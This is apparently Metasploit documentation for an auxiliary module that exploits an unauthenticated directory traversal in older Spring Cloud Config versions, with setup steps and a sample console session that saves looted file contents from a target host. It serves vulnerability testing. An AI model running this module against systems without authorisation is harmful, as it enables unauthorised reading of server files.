## Vulnerable Application

This module exploits an unauthenticated directory traversal vulnerability, which exists in Spring Cloud Config versions 2.1.x prior to 2.1.2,versions 2.0.x prior to 2.0.4, and versions 1.4.x prior to 1.4.6.
Spring Cloud Config listens by default on port 8888.

* https://github.com/spring-cloud/spring-cloud-config/archive/v2.1.1.RELEASE.zip

## Verification Steps

1. `./msfconsole`
2. `use auxiliary/scanner/http/springcloud_traversal`
3. `set rhosts <rhost>`
4. `run`

## Scenarios

### Tested against Linux zero 4.15.0-48-generic #51-Ubuntu SMP x86_64 GNU/Linux

```
msf > use auxiliary/scanner/http/springcloud_traversal 
msf auxiliary(scanner/http/springcloud_traversal) > set RHOSTS 192.168.1.132
RHOSTS => 192.168.1.132
msf auxiliary(scanner/http/springcloud_traversal) > run

[+] File saved in: /home/input0/.msf4/loot/20190418203756_default_192.168.1.132_springcloud.trav_893434.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/springcloud_traversal) >
```
